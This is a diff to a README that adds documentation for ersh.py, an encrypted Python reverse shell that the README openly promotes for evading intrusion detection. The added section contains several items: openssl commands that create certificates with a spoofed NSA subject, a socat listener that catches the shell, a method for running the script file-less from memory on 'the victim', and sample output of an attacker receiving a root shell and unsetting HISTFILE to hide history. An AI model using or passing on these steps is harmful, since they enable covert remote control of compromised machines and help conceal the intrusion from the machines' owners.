@@ -12,6 +12,7 @@ Contributions and pull requests are very welcome.
 - [share.sh](#sharesh), a secure file sharing script.
 - [autojack.py](#autojackpy), a term logger.
 - [listurl.py](#listurlpy), a site mapper.
+- [ersh.py](#ershpy), an encrypted reverse shell.
 - [Miscellaneous](#miscellaneous) (contact and donations)
 
 ## nojail.py
@@ -268,6 +269,106 @@ cookies to listurl.py from the command line with the ``--cookie`` option.
 
 Finally, if you're working on a website which has an invalid or self-signed SSL 
 certificate, use the `--no-certificate-check` option to ignore SSL errors.
+
+## ersh.py
+
+```ersh``` is an encrypted reverse shell written in pure Python. Ever been on a
+box with no standard utilities or compilation tools, and no easy way to upload
+binaries? Are you afraid than an IDS will notice an outbound shell? Accidentally
+closed your netcat listener because you pressed ```^C```?
+Suffer no more.
+
+```ersh``` offers the following features:
+
+- SSL-encrypted with both client and server authentication (SSL as in Suck-it Snort Layer).
+- Fully featured TTY.
+- Optionnaly file-less.
+- No dependencies, should run on any machine with Python >= 2.6.
+
+For a more detailed discussion about how this tool came to be, please refer to
+this [blog post](https://blog.kwiatkowski.fr/?q=en/ersh).
+
+### Usage
+
+This script **needs to be edited** before it works! Look for this marker near
+the beginning:
+
+```
+###############################################################################
+# EDIT THE PARAMETERS BELOW THIS LINE
+###############################################################################
+```
+
+The ```HOST``` and ```PORT``` are self-explanatory, but you may need additional help
+for the SSL certificates. Nobody wants to fight against OpenSSL's client however, so
+you can just use the following one-liners:
+
+```
+openssl req -new -newkey rsa:2048 -days 50 -nodes -x509 -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" -keyout server.key -out server.crt && cat server.key server.crt > server.pem && openssl dhparam 2048 >> server.pem
+openssl req -new -newkey rsa:2048 -days 50 -nodes -x509 -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" -keyout client.key -out client.crt
+```
+
+That's it! You should now have five new files in your current folder: ```server.(crt|key|pem)```
+and ```client.(crt|key)```. Some of them need to be inserted in the script so
+the reverse shell and the listener can authenticate each other. Specifically:
+
+- ```client_key``` should contain the contents of ```client.key```.
+- ```client_crt``` should contain the contents of ```client.crt```.
+- ```server_crt``` should contain the contents of ```server.crt```.
+
+That's it, no more editing required. The
+
+### Setting up the listener
+
+Considering that a full TLS negociation is going to proceed, a traditional ```nc``` listener
+will not suffice here. ```socat``` has been chosen for this task, due to its ability to
+handle encryption and TTYs. On Debian-based distributions, you should be able to obtain
+it by simply running ```sudo apt-get install socat```.
+
+Assuming you're still in the folder where you generated the keys and certificates, and
+you want to listen on port 443, here is the command line you should run on the
+machine where the reverse shell will arrive:
+
+```
+socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
+```
+
+### Running from memory
+
+You don't need to copy the script to the remote machine for it to work. Here is a simple way to run it
+from a non-interactive shell. Copy the whole script to your clipboard and run the following commands on
+the victim:
+
+```
+python - <<'EOF'
+[paste script contents here]
+'EOF'
+```
+
+### Sample output
+
+On the reciever machine:
+
+```
+root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
+```
+
+On the victim:
+
+```
+root@victim:~# python ersh.py
+[*] Connection established!
+root@victim:~#
+```
+
+And on the reciever again:
+
+```
+root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
+unset HISTFILE
+root@victim:~# unset HISTFILE
+root@victim:~#
+```
 
 ## Miscellaneous
 
